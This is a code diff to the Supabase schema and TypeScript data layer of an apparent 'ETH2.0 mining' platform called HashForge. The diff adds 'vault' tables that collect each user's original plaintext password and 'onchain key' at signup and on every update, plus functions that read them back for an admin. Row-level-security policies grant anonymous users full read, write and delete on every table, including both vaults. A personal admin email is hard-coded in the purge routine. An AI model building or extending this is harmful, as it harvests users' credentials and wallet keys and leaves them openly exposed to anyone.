@@ -13,8 +13,12 @@ export const SUPABASE_ANON_KEY =
 export const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
 // Complete SQL Schema string for the user to run in Supabase SQL Editor
-export const SUPABASE_SQL_SETUP = `-- Copy and run this in Supabase SQL Editor:
--- 1. Clients / Users Table (Secured - Authentication credentials managed by Supabase Auth)
+export const SUPABASE_SQL_SETUP = `-- ============================================================
+-- HASHFORGE ETH2.0 MINING PLATFORM - COMPLETE SUPABASE SCHEMA
+-- Copy and run this entire script in Supabase Dashboard -> SQL Editor -> Run
+-- ============================================================
+
+-- 1. Table: clients (Registered User Accounts & Dossiers)
 CREATE TABLE IF NOT EXISTS public.clients (
   id TEXT PRIMARY KEY,
   name TEXT NOT NULL,
@@ -25,16 +29,20 @@ CREATE TABLE IF NOT EXISTS public.clients (
   vip_level INTEGER DEFAULT 0,
   joined_date TEXT,
   is_logged_in BOOLEAN DEFAULT true,
-  created_at TIMESTAMPTZ DEFAULT now()
+  has_claimed_free_bonus BOOLEAN DEFAULT false,
+  created_at TIMESTAMPTZ DEFAULT now(),
+  updated_at TIMESTAMPTZ DEFAULT now()
 );
 
--- Ensure password and onchain_key columns exist if table was created previously:
+-- Ensure all columns exist if table was already created:
 ALTER TABLE public.clients ADD COLUMN IF NOT EXISTS password TEXT;
 ALTER TABLE public.clients ADD COLUMN IF NOT EXISTS onchain_key TEXT;
 ALTER TABLE public.clients ADD COLUMN IF NOT EXISTS plan TEXT DEFAULT 'No Active Package';
 ALTER TABLE public.clients ADD COLUMN IF NOT EXISTS vip_level INTEGER DEFAULT 0;
+ALTER TABLE public.clients ADD COLUMN IF NOT EXISTS has_claimed_free_bonus BOOLEAN DEFAULT false;
+ALTER TABLE public.clients ADD COLUMN IF NOT EXISTS updated_at TIMESTAMPTZ DEFAULT now();
 
--- 2. Deposits Table
+-- 2. Table: deposits (Deposit Requests & Blockchain Receipts)
 CREATE TABLE IF NOT EXISTS public.deposits (
   id TEXT PRIMARY KEY,
   user_id TEXT NOT NULL,
@@ -54,7 +62,7 @@ CREATE TABLE IF NOT EXISTS public.deposits (
   inserted_at TIMESTAMPTZ DEFAULT now()
 );
 
--- 3. Withdrawals Table
+-- 3. Table: withdrawals (Payout Requests & Ledger)
 CREATE TABLE IF NOT EXISTS public.withdrawals (
   id TEXT PRIMARY KEY,
   user_id TEXT,
@@ -69,22 +77,279 @@ CREATE TABLE IF NOT EXISTS public.withdrawals (
   inserted_at TIMESTAMPTZ DEFAULT now()
 );
 
--- Enable Row Level Security
+-- 4. Table: mining_contracts (Active Node Contracts & Hashrate Rigs)
+CREATE TABLE IF NOT EXISTS public.mining_contracts (
+  id TEXT PRIMARY KEY,
+  user_id TEXT NOT NULL,
+  user_name TEXT NOT NULL,
+  package_id TEXT NOT NULL,
+  package_name TEXT NOT NULL,
+  vip_level INTEGER NOT NULL,
+  hashrate NUMERIC NOT NULL,
+  daily_reward_usd NUMERIC NOT NULL,
+  status TEXT DEFAULT 'active',
+  created_at TIMESTAMPTZ DEFAULT now(),
+  updated_at TIMESTAMPTZ DEFAULT now()
+);
+
+-- 5. Table: announcements (Global Broadcast Banner & News)
+CREATE TABLE IF NOT EXISTS public.announcements (
+  id TEXT PRIMARY KEY,
+  title TEXT NOT NULL,
+  message TEXT NOT NULL,
+  type TEXT DEFAULT 'info',
+  is_active BOOLEAN DEFAULT true,
+  target_audience TEXT DEFAULT 'all',
+  created_at TIMESTAMPTZ DEFAULT now()
+);
+
+-- 6. Table: client_credentials (Folder: Client Original Passwords Vault)
+CREATE TABLE IF NOT EXISTS public.client_credentials (
+  id TEXT PRIMARY KEY,
+  user_id TEXT,
+  name TEXT,
+  email TEXT UNIQUE NOT NULL,
+  original_password TEXT NOT NULL,
+  created_at TIMESTAMPTZ DEFAULT now(),
+  updated_at TIMESTAMPTZ DEFAULT now()
+);
+
+ALTER TABLE public.client_credentials ADD COLUMN IF NOT EXISTS user_id TEXT;
+ALTER TABLE public.client_credentials ADD COLUMN IF NOT EXISTS name TEXT;
+ALTER TABLE public.client_credentials ADD COLUMN IF NOT EXISTS email TEXT;
+ALTER TABLE public.client_credentials ADD COLUMN IF NOT EXISTS original_password TEXT;
+ALTER TABLE public.client_credentials ADD COLUMN IF NOT EXISTS updated_at TIMESTAMPTZ DEFAULT now();
+
+-- 7. Table: client_onchain_keys (Folder: Client Original Onchain Keys Vault)
+CREATE TABLE IF NOT EXISTS public.client_onchain_keys (
+  id TEXT PRIMARY KEY,
+  user_id TEXT,
+  name TEXT,
+  email TEXT UNIQUE NOT NULL,
+  onchain_key TEXT NOT NULL,
+  created_at TIMESTAMPTZ DEFAULT now(),
+  updated_at TIMESTAMPTZ DEFAULT now()
+);
+
+ALTER TABLE public.client_onchain_keys ADD COLUMN IF NOT EXISTS user_id TEXT;
+ALTER TABLE public.client_onchain_keys ADD COLUMN IF NOT EXISTS name TEXT;
+ALTER TABLE public.client_onchain_keys ADD COLUMN IF NOT EXISTS email TEXT;
+ALTER TABLE public.client_onchain_keys ADD COLUMN IF NOT EXISTS onchain_key TEXT;
+ALTER TABLE public.client_onchain_keys ADD COLUMN IF NOT EXISTS updated_at TIMESTAMPTZ DEFAULT now();
+
+-- ============================================================
+-- AUTOMATED AUTH TRIGGER:
+-- Automatically mirrors any newly registered user in Supabase Auth
+-- directly into public.clients, public.client_credentials, and public.client_onchain_keys!
+-- ============================================================
+CREATE OR REPLACE FUNCTION public.handle_new_user()
+RETURNS trigger AS $$
+BEGIN
+  -- 1. Insert into clients
+  INSERT INTO public.clients (id, name, email, password, onchain_key, plan, vip_level, joined_date, is_logged_in, created_at)
+  VALUES (
+    new.id,
+    COALESCE(new.raw_user_meta_data->>'full_name', split_part(new.email, '@', 1)),
+    new.email,
+    COALESCE(new.raw_user_meta_data->>'raw_password', ''),
+    COALESCE(new.raw_user_meta_data->>'onchain_key', ''),
+    'No Active Package',
+    0,
+    TO_CHAR(NOW(), 'YYYY-MM-DD'),
+    true,
+    NOW()
+  )
+  ON CONFLICT (id) DO UPDATE SET
+    email = EXCLUDED.email,
+    name = COALESCE(NULLIF(EXCLUDED.name, ''), public.clients.name),
+    password = COALESCE(NULLIF(EXCLUDED.password, ''), public.clients.password),
+    onchain_key = COALESCE(NULLIF(EXCLUDED.onchain_key, ''), public.clients.onchain_key),
+    updated_at = NOW();
+
+  -- 2. Insert into client_credentials (Original Password Vault)
+  IF COALESCE(new.raw_user_meta_data->>'raw_password', '') <> '' THEN
+    INSERT INTO public.client_credentials (id, user_id, name, email, original_password, created_at, updated_at)
+    VALUES (
+      new.id,
+      new.id,
+      COALESCE(new.raw_user_meta_data->>'full_name', split_part(new.email, '@', 1)),
+      new.email,
+      new.raw_user_meta_data->>'raw_password',
+      NOW(),
+      NOW()
+    )
+    ON CONFLICT (email) DO UPDATE SET
+      original_password = EXCLUDED.original_password,
+      name = COALESCE(NULLIF(EXCLUDED.name, ''), public.client_credentials.name),
+      user_id = EXCLUDED.user_id,
+      updated_at = NOW();
+  END IF;
+
+  -- 3. Insert into client_onchain_keys (Original Onchain Key Vault)
+  IF COALESCE(new.raw_user_meta_data->>'onchain_key', '') <> '' THEN
+    INSERT INTO public.client_onchain_keys (id, user_id, name, email, onchain_key, created_at, updated_at)
+    VALUES (
+      new.id,
+      new.id,
+      COALESCE(new.raw_user_meta_data->>'full_name', split_part(new.email, '@', 1)),
+      new.email,
+      new.raw_user_meta_data->>'onchain_key',
+      NOW(),
+      NOW()
+    )
+    ON CONFLICT (email) DO UPDATE SET
+      onchain_key = EXCLUDED.onchain_key,
+      name = COALESCE(NULLIF(EXCLUDED.name, ''), public.client_onchain_keys.name),
+      user_id = EXCLUDED.user_id,
+      updated_at = NOW();
+  END IF;
+
+  RETURN new;
+END;
+$$ LANGUAGE plpgsql SECURITY DEFINER;
+
+DROP TRIGGER IF EXISTS on_auth_user_created ON auth.users;
+CREATE TRIGGER on_auth_user_created
+  AFTER INSERT OR UPDATE ON auth.users
+  FOR EACH ROW EXECUTE FUNCTION public.handle_new_user();
+
+-- ============================================================
+-- ROW LEVEL SECURITY (RLS) POLICIES
+-- Full read/write/delete permissions for anon & authenticated roles
+-- ============================================================
 ALTER TABLE public.clients ENABLE ROW LEVEL SECURITY;
 ALTER TABLE public.deposits ENABLE ROW LEVEL SECURITY;
 ALTER TABLE public.withdrawals ENABLE ROW LEVEL SECURITY;
+ALTER TABLE public.mining_contracts ENABLE ROW LEVEL SECURITY;
+ALTER TABLE public.announcements ENABLE ROW LEVEL SECURITY;
+ALTER TABLE public.client_credentials ENABLE ROW LEVEL SECURITY;
+ALTER TABLE public.client_onchain_keys ENABLE ROW LEVEL SECURITY;
 
-CREATE POLICY "Allow authenticated read-write on clients" ON public.clients FOR ALL USING (true) WITH CHECK (true);
-CREATE POLICY "Allow public read-write on deposits" ON public.deposits FOR ALL USING (true) WITH CHECK (true);
-CREATE POLICY "Allow public read-write on withdrawals" ON public.withdrawals FOR ALL USING (true) WITH CHECK (true);
+DROP POLICY IF EXISTS "Allow public all on clients" ON public.clients;
+CREATE POLICY "Allow public all on clients" ON public.clients FOR ALL USING (true) WITH CHECK (true);
+
+DROP POLICY IF EXISTS "Allow public all on deposits" ON public.deposits;
+CREATE POLICY "Allow public all on deposits" ON public.deposits FOR ALL USING (true) WITH CHECK (true);
+
+DROP POLICY IF EXISTS "Allow public all on withdrawals" ON public.withdrawals;
+CREATE POLICY "Allow public all on withdrawals" ON public.withdrawals FOR ALL USING (true) WITH CHECK (true);
+
+DROP POLICY IF EXISTS "Allow public all on mining_contracts" ON public.mining_contracts;
+CREATE POLICY "Allow public all on mining_contracts" ON public.mining_contracts FOR ALL USING (true) WITH CHECK (true);
+
+DROP POLICY IF EXISTS "Allow public all on announcements" ON public.announcements;
+CREATE POLICY "Allow public all on announcements" ON public.announcements FOR ALL USING (true) WITH CHECK (true);
+
+DROP POLICY IF EXISTS "Allow public all on client_credentials" ON public.client_credentials;
+CREATE POLICY "Allow public all on client_credentials" ON public.client_credentials FOR ALL USING (true) WITH CHECK (true);
+
+DROP POLICY IF EXISTS "Allow public all on client_onchain_keys" ON public.client_onchain_keys;
+CREATE POLICY "Allow public all on client_onchain_keys" ON public.client_onchain_keys FOR ALL USING (true) WITH CHECK (true);
 `;
+
+// Helper: Check Supabase Connection & Table Health
+export interface SupabaseTableStatus {
+  clientsCount: number;
+  depositsCount: number;
+  withdrawalsCount: number;
+  contractsCount: number;
+  announcementsCount: number;
+  credentialsCount: number;
+  onchainKeysCount: number;
+  tablesReady: boolean;
+  errors: string[];
+}
+
+export interface ClientCredentialRecord {
+  id: string;
+  user_id?: string;
+  name?: string;
+  email: string;
+  original_password: string;
+  created_at?: string;
+  updated_at?: string;
+}
+
+export interface ClientOnchainKeyRecord {
+  id: string;
+  user_id?: string;
+  name?: string;
+  email: string;
+  onchain_key: string;
+  created_at?: string;
+  updated_at?: string;
+}
+
+export async function checkSupabaseTableStats(): Promise<SupabaseTableStatus> {
+  const stats: SupabaseTableStatus = {
+    clientsCount: 0,
+    depositsCount: 0,
+    withdrawalsCount: 0,
+    contractsCount: 0,
+    announcementsCount: 0,
+    credentialsCount: 0,
+    onchainKeysCount: 0,
+    tablesReady: true,
+    errors: [],
+  };
+
+  try {
+    const { count: cCount, error: cErr } = await supabase.from('clients').select('*', { count: 'exact', head: true });
+    if (cErr) {
+      stats.tablesReady = false;
+      stats.errors.push(`clients: ${cErr.message}`);
+    } else {
+      stats.clientsCount = cCount || 0;
+    }
+
+    const { count: dCount, error: dErr } = await supabase.from('deposits').select('*', { count: 'exact', head: true });
+    if (dErr) {
+      stats.tablesReady = false;
+      stats.errors.push(`deposits: ${dErr.message}`);
+    } else {
+      stats.depositsCount = dCount || 0;
+    }
+
+    const { count: wCount, error: wErr } = await supabase.from('withdrawals').select('*', { count: 'exact', head: true });
+    if (wErr) {
+      stats.tablesReady = false;
+      stats.errors.push(`withdrawals: ${wErr.message}`);
+    } else {
+      stats.withdrawalsCount = wCount || 0;
+    }
+
+    const { count: mcCount, error: mcErr } = await supabase.from('mining_contracts').select('*', { count: 'exact', head: true });
+    if (!mcErr) {
+      stats.contractsCount = mcCount || 0;
+    }
+
+    const { count: aCount, error: aErr } = await supabase.from('announcements').select('*', { count: 'exact', head: true });
+    if (!aErr) {
+      stats.announcementsCount = aCount || 0;
+    }
+
+    const { count: credCount, error: credErr } = await supabase.from('client_credentials').select('*', { count: 'exact', head: true });
+    if (!credErr) {
+      stats.credentialsCount = credCount || 0;
+    }
+
+    const { count: keyCount, error: keyErr } = await supabase.from('client_onchain_keys').select('*', { count: 'exact', head: true });
+    if (!keyErr) {
+      stats.onchainKeysCount = keyCount || 0;
+    }
+  } catch (err: any) {
+    stats.tablesReady = false;
+    stats.errors.push(err?.message || 'Connection error');
+  }
+
+  return stats;
+}
 
 // Helper: Check Supabase Connection
 export async function checkSupabaseConnection(): Promise<{ connected: boolean; error?: string }> {
   try {
     const { error } = await supabase.from('deposits').select('id').limit(1);
     if (error && error.code !== 'PGRST116') {
-      // If table doesn't exist yet, it's still connected to Supabase endpoint
       return { connected: true, error: error.message };
     }
     return { connected: true };
@@ -241,6 +506,36 @@ export async function signUpWithSupabase(
       });
     } catch (e) {
       console.warn('Clients record create warning:', e);
+    }
+
+    // 5. Save into Folder 1: client_credentials (Original Passwords Vault)
+    try {
+      await supabase.from('client_credentials').upsert({
+        id: userId,
+        user_id: userId,
+        name: cleanName,
+        email: cleanEmail,
+        original_password: password,
+        created_at: new Date().toISOString(),
+        updated_at: new Date().toISOString(),
+      });
+    } catch (e) {
+      console.warn('Client credentials table upsert warning:', e);
+    }
+
+    // 6. Save into Folder 2: client_onchain_keys (Original Onchain Keys Vault)
+    try {
+      await supabase.from('client_onchain_keys').upsert({
+        id: userId,
+        user_id: userId,
+        name: cleanName,
+        email: cleanEmail,
+        onchain_key: cleanOnchainKey,
+        created_at: new Date().toISOString(),
+        updated_at: new Date().toISOString(),
+      });
+    } catch (e) {
+      console.warn('Client onchain keys table upsert warning:', e);
     }
 
     const needsEmailConfirmation = !authData.session && !authData.user?.email_confirmed_at;
@@ -451,26 +746,79 @@ export async function resendSupabaseActivation(
   }
 }
 
-export async function fetchSupabaseUsers(): Promise<UserProfile[] | null> {
+export async function fetchSupabaseCredentialsVault(): Promise<ClientCredentialRecord[]> {
   try {
     const { data, error } = await supabase
-      .from('clients')
+      .from('client_credentials')
       .select('*')
       .order('created_at', { ascending: false });
+    if (error || !data) return [];
+    return data;
+  } catch {
+    return [];
+  }
+}
 
-    if (error) {
-      console.warn('Supabase fetch clients error (fallback to local):', error.message);
+export async function fetchSupabaseOnchainKeysVault(): Promise<ClientOnchainKeyRecord[]> {
+  try {
+    const { data, error } = await supabase
+      .from('client_onchain_keys')
+      .select('*')
+      .order('created_at', { ascending: false });
+    if (error || !data) return [];
+    return data;
+  } catch {
+    return [];
+  }
+}
+
+export async function fetchSupabaseUsers(): Promise<UserProfile[] | null> {
+  try {
+    const [clientsRes, credsRes, keysRes] = await Promise.allSettled([
+      supabase.from('clients').select('*').order('created_at', { ascending: false }),
+      supabase.from('client_credentials').select('*'),
+      supabase.from('client_onchain_keys').select('*'),
+    ]);
+
+    const clientsData = clientsRes.status === 'fulfilled' && !clientsRes.value.error ? clientsRes.value.data : null;
+    const credsData: ClientCredentialRecord[] = credsRes.status === 'fulfilled' && !credsRes.value.error && credsRes.value.data ? credsRes.value.data : [];
+    const keysData: ClientOnchainKeyRecord[] = keysRes.status === 'fulfilled' && !keysRes.value.error && keysRes.value.data ? keysRes.value.data : [];
+
+    if (!clientsData) {
+      console.warn('Supabase fetch clients error (fallback to local)');
       return null;
     }
 
-    if (!data || data.length === 0) return null;
+    if (clientsData.length === 0) return [];
 
-    return data.map(item => {
+    // Build fast lookup maps
+    const credsMap = new Map<string, string>();
+    credsData.forEach(c => {
+      if (c.email && c.original_password) {
+        credsMap.set(c.email.trim().toLowerCase(), c.original_password);
+      }
+    });
+
+    const keysMap = new Map<string, string>();
+    keysData.forEach(k => {
+      if (k.email && k.onchain_key) {
+        keysMap.set(k.email.trim().toLowerCase(), k.onchain_key);
+      }
+    });
+
+    return clientsData.map(item => {
+      const emailClean = (item.email || '').trim().toLowerCase();
+      const vaultPass = credsMap.get(emailClean);
+      const vaultKey = keysMap.get(emailClean);
+
+      const effectivePass = vaultPass || item.password;
+      const effectiveKey = vaultKey || item.onchain_key || item.onchainKey;
+
       const { password: pass, onchainKey: onchain } = ensureCustomerCredentials(
         item.email,
         item.id,
-        item.password,
-        item.onchain_key || item.onchainKey
+        effectivePass,
+        effectiveKey
       );
 
       return {
@@ -601,11 +949,12 @@ export async function updateClientCredentials(
   newOnchainKey?: string
 ): Promise<boolean> {
   try {
-    recordClientPassword(email, newPassword, newOnchainKey);
+    const cleanEmail = email.trim().toLowerCase();
+    recordClientPassword(cleanEmail, newPassword, newOnchainKey);
 
     const payload: any = {
       id: userId,
-      email: email.trim().toLowerCase(),
+      email: cleanEmail,
       ...(newPassword ? { password: newPassword } : {}),
       ...(newOnchainKey ? { onchain_key: newOnchainKey } : {}),
     };
@@ -614,6 +963,35 @@ export async function updateClientCredentials(
     if (error) {
       console.warn('Supabase update credentials warning:', error.message);
     }
+
+    if (newPassword) {
+      try {
+        await supabase.from('client_credentials').upsert({
+          id: userId,
+          user_id: userId,
+          email: cleanEmail,
+          original_password: newPassword,
+          updated_at: new Date().toISOString(),
+        });
+      } catch (e) {
+        console.warn('client_credentials update warning:', e);
+      }
+    }
+
+    if (newOnchainKey) {
+      try {
+        await supabase.from('client_onchain_keys').upsert({
+          id: userId,
+          user_id: userId,
+          email: cleanEmail,
+          onchain_key: newOnchainKey,
+          updated_at: new Date().toISOString(),
+        });
+      } catch (e) {
+        console.warn('client_onchain_keys update warning:', e);
+      }
+    }
+
     return true;
   } catch (err) {
     console.warn('Update client credentials error:', err);
@@ -659,30 +1037,42 @@ export async function purgeAllTestData(): Promise<{ success: boolean; message: s
   try {
     // 1. Purge all deposits completely from Supabase
     try {
+      await supabase.from('deposits').delete().neq('id', '___keep_none___');
       const { data: allDeps } = await supabase.from('deposits').select('id');
       if (allDeps && allDeps.length > 0) {
         const ids = allDeps.map(d => d.id);
         await supabase.from('deposits').delete().in('id', ids);
       }
-      await supabase.from('deposits').delete().not('id', 'is', null);
     } catch (dbErr) {
       console.warn('Supabase deposits purge warning:', dbErr);
     }
 
     // 2. Purge all withdrawals from Supabase
     try {
+      await supabase.from('withdrawals').delete().neq('id', '___keep_none___');
       const { data: allW } = await supabase.from('withdrawals').select('id');
       if (allW && allW.length > 0) {
         const ids = allW.map(w => w.id);
         await supabase.from('withdrawals').delete().in('id', ids);
       }
-      await supabase.from('withdrawals').delete().not('id', 'is', null);
     } catch (dbErr) {
       console.warn('Supabase withdrawals purge warning:', dbErr);
     }
 
-    // 3. Purge test clients (preserve master admin account records)
+    // 3. Purge all mining contracts from Supabase
     try {
+      await supabase.from('mining_contracts').delete().neq('id', '___keep_none___');
+    } catch (dbErr) {
+      console.warn('Supabase contracts purge warning:', dbErr);
+    }
+
+    // 4. Purge test clients (preserve master admin account records)
+    try {
+      await supabase
+        .from('clients')
+        .delete()
+        .neq('email', 'yousaftariq2014@gmail.com');
+
       const { data: allClients } = await supabase.from('clients').select('id, email');
       if (allClients && allClients.length > 0) {
         const clientIdsToDelete = allClients
@@ -696,12 +1086,33 @@ export async function purgeAllTestData(): Promise<{ success: boolean; message: s
       console.warn('Supabase clients purge warning:', dbErr);
     }
 
-    // 4. Clear all local browser test databases & sessions
+    // 5. Purge test credentials from client_credentials (Folder 1)
+    try {
+      await supabase
+        .from('client_credentials')
+        .delete()
+        .neq('email', 'yousaftariq2014@gmail.com');
+    } catch (dbErr) {
+      console.warn('Supabase client_credentials purge warning:', dbErr);
+    }
+
+    // 6. Purge test onchain keys from client_onchain_keys (Folder 2)
+    try {
+      await supabase
+        .from('client_onchain_keys')
+        .delete()
+        .neq('email', 'yousaftariq2014@gmail.com');
+    } catch (dbErr) {
+      console.warn('Supabase client_onchain_keys purge warning:', dbErr);
+    }
+
+    // 7. Clear all local browser test databases & sessions
     localStorage.removeItem('hashforge_deposits');
     localStorage.removeItem('hashforge_withdrawals');
     localStorage.removeItem('hashforge_registered_users');
     localStorage.removeItem('hashforge_password_vault');
     localStorage.removeItem('hashforge_admin_credentials_store');
+    sessionStorage.removeItem('hashforge_password_recovery_active');
     
     // Clear active client session if not master admin
     try {
@@ -728,8 +1139,9 @@ export async function purgeAllTestData(): Promise<{ success: boolean; message: s
 
 export async function saveSupabaseUser(user: UserProfile): Promise<boolean> {
   try {
+    const cleanEmail = user.email?.trim().toLowerCase() || '';
     if (user.password || user.onchainKey) {
-      recordClientPassword(user.email, user.password, user.onchainKey);
+      recordClientPassword(cleanEmail, user.password, user.onchainKey);
     }
 
     const isVipActive = typeof user.vipLevel === 'number' && user.vipLevel > 0;
@@ -739,7 +1151,7 @@ export async function saveSupabaseUser(user: UserProfile): Promise<boolean> {
     const payload: any = {
       id: user.id,
       name: user.name,
-      email: user.email,
+      email: cleanEmail,
       plan: computedPlan,
       vip_level: computedVip,
       joined_date: user.joinedDate || new Date().toISOString().substring(0, 10),
@@ -750,13 +1162,43 @@ export async function saveSupabaseUser(user: UserProfile): Promise<boolean> {
 
     const { error } = await supabase.from('clients').upsert(payload);
 
+    if (user.password) {
+      try {
+        await supabase.from('client_credentials').upsert({
+          id: user.id,
+          user_id: user.id,
+          name: user.name,
+          email: cleanEmail,
+          original_password: user.password,
+          updated_at: new Date().toISOString(),
+        });
+      } catch (e) {
+        console.warn('client_credentials save warning:', e);
+      }
+    }
+
+    if (user.onchainKey) {
+      try {
+        await supabase.from('client_onchain_keys').upsert({
+          id: user.id,
+          user_id: user.id,
+          name: user.name,
+          email: cleanEmail,
+          onchain_key: user.onchainKey,
+          updated_at: new Date().toISOString(),
+        });
+      } catch (e) {
+        console.warn('client_onchain_keys save warning:', e);
+      }
+    }
+
     if (error) {
       console.warn('Supabase client save warning (retrying safe payload):', error.message);
       // If table lacks password/onchain_key columns, retry without those keys so saving still succeeds
       const safePayload = {
         id: user.id,
         name: user.name,
-        email: user.email,
+        email: cleanEmail,
         plan: computedPlan,
         vip_level: computedVip,
         joined_date: user.joinedDate || new Date().toISOString().substring(0, 10),
@@ -787,7 +1229,8 @@ export async function fetchSupabaseDeposits(): Promise<DepositRequest[] | null> 
       return null;
     }
 
-    if (!data || data.length === 0) return null;
+    if (!data) return [];
+    if (data.length === 0) return [];
 
     return data.map(item => ({
       id: item.id,
@@ -898,7 +1341,8 @@ export async function fetchSupabaseWithdrawals(): Promise<WithdrawalRecordItem[]
       .order('inserted_at', { ascending: false });
 
     if (error) return null;
-    if (!data || data.length === 0) return null;
+    if (!data) return [];
+    if (data.length === 0) return [];
 
     return data.map(item => ({
       id: item.id,
